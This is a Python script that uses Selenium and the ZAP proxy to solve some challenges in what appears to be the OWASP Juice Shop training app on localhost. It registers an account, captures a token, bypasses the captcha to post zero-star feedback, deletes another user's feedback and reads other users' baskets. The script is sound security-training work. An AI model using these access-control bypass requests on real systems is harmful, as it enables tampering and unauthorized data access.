import os
import os.path
from zapv2 import ZAPv2
import requests
import json
from selenium import webdriver
from selenium.webdriver.common.proxy import Proxy, ProxyType
import time

target = 'http://localhost:3000'

def get_browser():
  os.environ["webdriver.chrome.driver"] = os.path.expanduser("~") + '/Library/Application Support/ZAP/webdriver/macos/64/chromedriver'

  proxy = Proxy()
  proxy.proxy_type = ProxyType.MANUAL
  proxy.http_proxy = "127.0.0.1:8080"
  proxy.socks_proxy = "127.0.0.1:8080"
  proxy.ssl_proxy = "127.0.0.1:8080"

  capabilities = webdriver.DesiredCapabilities.CHROME
  proxy.add_to_capabilities(capabilities)

  options = webdriver.ChromeOptions()
  options.add_argument('--ignore-certificate-errors')
  options.add_argument("--test-type")
  return webdriver.Chrome(executable_path=os.environ["webdriver.chrome.driver"], chrome_options=options, desired_capabilities=capabilities)


def challenge_score_board(browser):
  browser.get('%s/#/score-board' % target)
  time.sleep(1)


def challenge_administration(browser):
  browser.get('%s/#/score-board' % target)
  time.sleep(1)


def challenge_reflected_xss(browser):
  browser.get('%s/#/score-board' % target)
  time.sleep(1)


zap = ZAPv2()
proxy = zap._ZAPv2__proxies
headers = {'Content-Type': 'application/json'}
browser = get_browser()
email = "test@test.com"
password = "testtest"

# Access score board
challenge_score_board(browser)

# Access Admin
challenge_administration(browser)

# Reflected XSS
challenge_reflected_xss(browser)

browser.quit()




# Register
payload = {
  "email": email,
  "password": password,
  "passwordRepeat": password,
  "securityQuestion":{
    "id":1,
    "question":"Your eldest siblings middle name?",
    "createdAt":"2018-11-07T21:19:32.395Z",
    "updatedAt":"2018-11-07T21:19:32.395Z"
  },
  "securityAnswer": password
}
response = requests.post("%s/api/Users/" % target, headers=headers, proxies=proxy, verify=False, data=json.dumps(payload))

try:
  print(response.json())
except Exception as err:
  print(err)
  pass

# Login and capture token
payload = {"email": email, "password": password}
response = requests.post("%s/rest/user/login" % target, headers=headers, proxies=proxy, verify=False, data=json.dumps(payload))
data = {}

try:
  data = response.json()
except Exception as err:
  print("Login time")
  print(err)
  print(response.text)
  exit()
  
token = data['authentication']['token']
headers['Authorization'] =  'Bearer ' + token

# Get captcha for giving feedback then post feedback of 0
captcha = requests.get("%s/rest/captcha/" % target, proxies=proxy, verify=False, headers=headers).json()
data = requests.post("%s/api/Feedbacks/" % target, headers=headers, proxies=proxy, verify=False, data=json.dumps({
  "comment":"Comment?",
  "rating":0,
  "captcha":captcha["answer"],
  "captchaId":captcha["captchaId"]
})).json()
print(data)

# Delete 5-star feedback
print(requests.delete("%s/api/Feedbacks/1" % target, proxies=proxy, verify=False, headers=headers).text)


# Access someone elses bucket
zap.urlopen("%s/rest/basket/1" % target)
zap.urlopen("%s/rest/basket/2" % target)

print("")
print("[!] Challenges")
data = requests.get("%s/api/Challenges/" % target,headers=headers, proxies=proxy, verify=False).json()
solved = [c for c in data['data'] if c['solved']]

for s in solved:
  print(" - " + s['name'])